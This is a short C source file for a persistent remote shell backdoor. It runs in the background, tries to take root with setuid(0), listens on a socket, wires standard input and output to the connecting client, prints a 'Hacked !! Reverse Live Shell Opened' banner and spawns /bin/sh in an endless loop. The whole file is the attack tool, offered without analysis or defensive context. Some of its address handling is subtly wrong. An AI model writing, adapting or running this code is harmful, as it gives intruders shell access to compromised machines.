
#include <stdlib.h>
#include <unistd.h>
#include <cstring>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

struct sockaddr_in attacker={.sin_family=AF_INET,.sin_port=htons(PORT)}, tmp;
int b, l, a;

int main(void){
if (fork()>0)exit(0);
while (1){
  struct hostent* host=gethostbyname(IP);
  if (host==0x00)
     inet_pton(AF_INET,IP,&attacker.sin_addr.s_addr);
  else
     attacker.sin_addr.s_addr=*(long*)host->h_name;
  int t=1;
  setuid(0);seteuid(0);
  int s=socket(AF_INET, SOCK_STREAM,0);
  t=setsockopt(s, SOL_SOCKET, SO_REUSEADDR,&t, sizeof(int));
  b=bind(s,(struct sockaddr*)&attacker,sizeof(attacker));
  l=listen(s, 1);
  socklen_t atl=sizeof(tmp);
  a=accept(s,(struct sockaddr*)&tmp,&atl);
  for (int fd=0;fd<3;fd++) { close(fd); dup2(a,fd);}
  send(a,"☢ Hacked !!Reverse Live Shell Opened !!\n", sizeof("☢ Hacked !!Reverse Live Shell Opened !!\n"),0);
  system("/bin/sh");
  close(a);
  close(s);
  }
}

